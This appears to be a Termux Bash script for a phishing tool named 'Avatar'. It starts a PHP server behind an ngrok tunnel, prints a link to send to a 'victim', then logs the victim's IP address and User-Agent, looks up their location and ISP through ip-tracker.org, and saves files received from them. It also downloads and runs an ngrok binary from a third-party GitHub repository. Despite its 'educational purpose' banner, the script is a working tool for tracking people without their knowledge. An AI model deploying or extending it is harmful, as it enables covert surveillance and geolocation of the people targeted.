    
trap 'printf "\n";stop' 2
    
banner() { 
   
printf "\e[1;96m     _             _               \e[0m\n"
printf "\e[1;96m    / \__   ____ _| |_ __ _ _ __   \e[0m\n"
printf "\e[1;96m   / _ \ \ / / _° | __/ _° l °__|  \e[0m\n"
printf "\e[1;96m  / ___ \ V / (_| | || (_| | |     \e[0m\n"
printf "\e[1;96m /_/   \_\_/ \__,_|\__\__,_|_|     \e[0m\n"
printf "\n"
echo -e "\e[33m\e[1mSubscribe Our \e[0m\e[101m\e[1m ▶ \e[0m\e[36m YouTube channel for Lattest  Termux Tools \n\e[34mhttps://www.youtube.com/channel/UCsFovGDIsDzntfXmTZadTyg \e[0m"
printf "\n"
printf "\e[1;93m°°°\e[0m\033[4;36m ONLY FOR EDUCATIONAL PURPOSE \e[0m\e[1;93m°°°\e[0m\n"
printf "\n"
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Installing it.......";pkg install php; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Installing it.......";pkg install wget; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Installing it........";pkg install unzip; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Installing it.......";pkg install curl; exit 1; }
}


catch_ip() {
touch saved.location.txt
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' ip.txt | cut -d '"' -f2)
printf "🌐\e[1;93m Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "🌐\e[1;93m User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "🌐\e[1;32m Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat ip.txt >> saved.ip.txt

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "🌐\e[1;32m Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "🌐\e[1;32m Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "🌐\e[1;32m IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "🌐\e[1;32m IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "🌐\e[1;32m State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "🌐\e[1;32m City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "🌐\e[1;32m ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "🌐\e[1;32m AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "🌐\e[1;32m IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "🌐\e[1;32m IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

}

checkfound() {

printf "\n"
printf "👤🔍️\e[1;93m scanning \e[36mAvatar \e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "👤\e[1;93m Avatar opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "📸\e[1;93m  Avatar file received!📲 and  Saved 📥\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
done 
}





start() {
if [[ -e ip.txt ]]; then
rm -rf ip.txt

fi
if [[ -e ngrok ]]; then
echo ""
else

printf "📥\e[1;92m Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm')

if [[ $arch == *'arm'* ]]; then
wget https://github.com/Infectedterminal/geo/raw/main/ngrok.zip > /dev/null 2>&1

if [[ -e ngrok.zip ]]; then
unzip ngrok.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok.zip

else
printf "⚠️\e[1;93m Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
else
wget https://github.com/Infectedterminal/geo/raw/main/ngrok.zip > /dev/null 2>&1
if [[ -e ngrok.zip ]]; then
unzip ngrok.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok.zip

else
printf "⚠️\e[1;93m Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
fi
fi

printf "🕒\e[1;32m Starting php server  \n"
 php -S 127.0.0.1:1413 > /dev/null 2>&1 & 
sleep 2
printf "🕔\e[1;32m Starting ngrok server  \n"
./ngrok http 1413 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "🕤\e[1;32m Ngrok Link🔗 👉 \e[0m\e[1;77m %s\e[0m\n" $link
checkfound
}




banner
dependencies
start




